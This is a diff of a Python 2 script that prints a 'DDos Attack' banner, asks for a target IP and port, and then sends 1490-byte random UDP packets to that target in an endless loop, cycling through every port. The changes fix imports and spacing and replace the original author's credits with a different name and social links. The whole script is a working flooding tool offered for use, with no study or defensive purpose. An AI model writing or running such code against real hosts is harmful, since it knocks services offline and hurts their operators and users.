@@ -1,8 +1,8 @@
 import sys
-import  you
-import  time
+import os
+import time
 import socket
-import  random
+import random
 #Code Time
 from datetime import datetime
 now = datetime.now()
@@ -13,17 +13,17 @@ month = now.month
 year = now.year
 
 ##############
-sock  =  socket . socket ( socket . AF_INET , socket . SOCK_DGRAM )
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 bytes = random._urandom(1490)
 #############
 
 os.system("clear")
 os.system("figlet DDos Attack")
 print
-print "Author   : Prathamesh"
-print "You Tube : https://www.youtube.com/c/Prathamesh18111999"
-print "github   : https://github.com/PRATHAM18111999"
-print "Twitter : https://twitter.com/pratham18111999"
+print "Author   : Tech Tushar"
+print "You Tube : https://www.youtube.com/c/TechTushar"
+print "github   : https://github.com/Techtushar07"
+print "Facebook : https://www.facebook.com/daveratushar/"
 print
 ip = raw_input("IP Target : ")
 port = input("Port       : ")
@@ -44,7 +44,8 @@ sent = 0
 while True:
      sock.sendto(bytes, (ip,port))
      sent = sent + 1
-     port  =  port  +  1
+     port = port + 1
      print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
      if port == 65534:
        port = 1
+
